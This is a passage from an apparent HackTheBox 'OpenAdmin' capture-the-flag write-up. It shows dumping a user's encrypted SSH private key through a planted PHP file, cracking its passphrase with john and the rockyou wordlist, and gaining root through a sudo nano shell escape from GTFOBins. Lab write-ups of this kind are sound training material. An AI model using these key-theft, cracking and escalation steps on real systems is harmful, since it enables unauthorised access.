<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/$ curl 127.0.0.1:52846/hg8.php</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">[...]</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>Bingo! </p>
<p><em>Note: Don’t forget to remove your php file to not spoil users after you ;)</em></p>
<p>We can now use <code>joanna</code> ssh private key to login to her account:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i joanna_id_rsa joanna@openadmin.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'joanna_id_rsa'</span>:</span><br></pre></td></tr></table></figure>

<p>No luck! Passphrase is needed. From here we have two choices:</p>
<ol>
<li><p>Either we go back to our php script and edit it to open a reverse shell instead of grabbing the private key.</p>
</li>
<li><p>We try to brute-force <code>joanna</code> private key passphrase. </p>
</li>
</ol>
<p>I think it would be more interesting to show how to brute-force the hash, if we fail we can still go back to open a simple reserve shell. </p>
<p>I will use <code>john</code> to bruteforce the ssh key passphrase:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john joanna_id_rsa &gt; id_rsa.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">bloodninjas      (joanna_id_rsa)</span><br><span class="line">1g 0:00:00:14 DONE (2020-01-24 17:05) 0.07062g/s 1012Kp/s 1012Kc/s 1012KC/s *7¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line">[hg8@archbook ~]$ john --show id_rsa.hash</span><br><span class="line">joanna_id_rsa:bloodninjas</span><br></pre></td></tr></table></figure>

<p>Great we got it, and it’s related to ninja again. Let’s grab our flag now:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i joanna_id_rsa joanna@openadmin.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'joanna_id_rsa'</span>:</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3</span><br><span class="line">joanna@openadmin:~$ cat user.txt</span><br><span class="line">cxxxxxxxxxxxxxxxxxxxxxxxxxxf</span><br></pre></td></tr></table></figure>

<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The recon phase won’t be needed there since we already got the information we needed while searching around for user flag. As a reminder:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">joanna@openadmin:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> joanna on openadmin:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User joanna may run the following commands on openadmin:</span><br><span class="line">    (ALL) NOPASSWD: /bin/nano /opt/priv</span><br></pre></td></tr></table></figure>

<p>A good habit for fast privilege escalation techniques is to check on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>.    </p>
<p>As a reminder:</p>
<blockquote>
<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
</blockquote>
<p>And of course there is an entry for <code>nano</code>:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/73084568-7b88c480-3ecd-11ea-8092-c4d2e7eb43ed.png" alt="GTFObins nano"></p>
<p><em>Note: ^R means CTRL+R, same for ^X means CTRL+X</em></p>
<h3 id="Exploit-nano-SUID"><a href="#Exploit-nano-SUID" class="headerlink" title="Exploit nano SUID"></a>Exploit nano SUID</h3><p>Let’s give it a try!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">joanna@openadmin:~$ sudo /bin/nano /opt/priv</span><br><span class="line">^R^X</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)         </span><br><span class="line"><span class="comment"># cat /root/root.txt                           </span></span><br><span class="line">2xxxxxxxxxxxxxxxxxxxxxxxx1</span><br></pre></td></tr></table></figure>

<hr>
<p>As always do not hesitate to contact me for any questions or feedbacks :)</p>
<p>See you next time !</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/linux/">linux</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/apache/" rel="tag">apache</a>, <a class="tag-link" href="/tags/exploit/" rel="tag">exploit</a>, <a class="tag-link" href="/tags/gtfobins/" rel="tag">gtfobins</a>, <a class="tag-link" href="/tags/john/" rel="tag">john</a>, <a class="tag-link" href="/tags/openadmin/" rel="tag">openadmin</a>, <a class="tag-link" href="/tags/opennetadmin/" rel="tag">opennetadmin</a>, <a class="tag-link" href="/tags/php/" rel="tag">php</a>, <a class="tag-link" href="/tags/shell-exec/" rel="tag">shell_exec</a>, <a class="tag-link" href="/tags/ssh/" rel="tag">ssh</a>, <a class="tag-link" href="/tags/sudo/" rel="tag">sudo</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-jimmy"><span class="toc-number">1.2.</span> <span class="toc-text">Pivot www-data -&gt; jimmy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-jimmy-gt-joanna"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot jimmy -&gt; joanna</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-nano-SUID"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit nano SUID</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/openadmin/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/openadmin/&text=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/openadmin/&is_video=false&description=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - OpenAdmin&body=Check out this article: https://hg8.sh/openadmin/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/openadmin/&name=HackTheBox - OpenAdmin&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/openadmin/&t=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
